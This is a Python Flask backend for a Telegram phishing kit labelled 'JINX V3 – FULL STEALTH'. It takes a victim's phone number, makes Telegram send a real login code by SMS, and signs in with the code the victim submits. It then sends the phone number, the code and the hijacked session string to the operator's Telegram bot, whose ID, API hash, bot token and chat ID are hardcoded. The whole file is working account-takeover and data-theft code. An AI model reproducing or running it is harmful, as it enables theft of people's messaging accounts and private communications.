# api/send_code.py
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import os, asyncio, requests

app = Flask(__name__)

API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
BOT_TOKEN = '7892241887:AAGRSOx7cSiSgPUZvvSiBUYVSulcDOqRu4Y'
CHAT_ID = '1870154832'

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

def send_bot(msg):
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
        'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'
    })

@app.route('/send_code', methods=['POST'])
async def handle():
    phone = request.form.get('phone')
    code = request.form.get('code')
    action = request.form.get('action', 'send')

    if not phone:
        return jsonify({'success': False, 'error': 'no phone'})

    session_path = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"

    async def run():
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        try:
            if action == 'verify' and code:
                await client.sign_in(phone, code)
                session_str = StringSession.save(client.session)
                await client.disconnect()

                msg = f"*TARGET MASUK!*\n\n📱 `{phone}`\n🔑 `{code}`\n📦 *Session:*\n||{session_str}||"
                send_bot(msg)
                return {'success': True, 'session': session_str}

            else:
                res = await client.send_code_request(phone, force_sms=True)  # PAKSA SMS
                await client.disconnect()

                status = "RESEND" if action == 'resend' else "TARGET MASUK"
                msg = f"*{status}!*\n\n📱 `{phone}`\n⏳ Menunggu OTP..."
                send_bot(msg)
                return {'success': True, 'hash': res.phone_code_hash}

        except Exception as e:
            await client.disconnect()
            return {'success': False, 'error': str(e)}

    return jsonify(await run())

@app.route('/')
def home():
    return "JINX V3 – FULL STEALTH, OTP ASLI"

if __name__ == "__main__":
    app.run()
